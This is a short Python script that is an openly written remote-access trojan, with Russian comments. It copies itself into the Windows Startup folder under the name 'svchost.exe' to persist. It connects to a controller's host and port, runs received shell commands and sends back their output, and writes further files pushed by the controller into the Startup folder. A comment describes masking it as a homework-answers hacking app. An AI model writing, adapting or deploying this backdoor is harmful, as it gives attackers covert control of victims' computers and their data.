import os, sys

file_name = 'svchost.exe'
startup_folder = os.getenv('APPDATA')[0:-8] + '\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'

def MeGaViRus228():

    import socket

    HOST = '127.0.0.1'# WIN+R -> CMD -> IPCONFIG -> Ethernet adapter Ethernet ->  IPv4 Address
                      # Или IP аддрес сервера
    
    PORT = 1337

    auto_start_folder = os.getenv('APPDATA')[0:-8] + '\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    cmd = False
    
    while True:
        s_cmd = client.recv(4096).decode('utf-8')
        print(s_cmd)
        if s_cmd == 'cmd':
            cmd = not cmd
            client.send(f'cmd status: {str(cmd)}'.encode('utf-8'))

        elif cmd:
            out = os.popen(s_cmd).read()
            client.send(f'CMD EXEC: {out}'.encode('utf-8'))

        elif s_cmd == 'prep_to_file':
            f_name = client.recv(1024).decode('utf-8')
            rec_virus = open(auto_start_folder+'\\'+f_name, 'wb').write(client.recv(1024))


        else:
            client.send(f'NOW'.encode('utf-8'))
        print('qwe')

if sys.argv[0] != startup_folder + file_name:
    with open(sys.argv[0], 'rb') as f:
        file = f.read()

    with open(startup_folder + file_name, 'wb') as f:
        f.write(file)
    print(startup_folder + file_name)
    ##
    print('Взлом ГДЗ') 
    # Любой Другой Код под который замаскировано приложение
    ##
    MeGaViRus228()
else:
    MeGaViRus228()
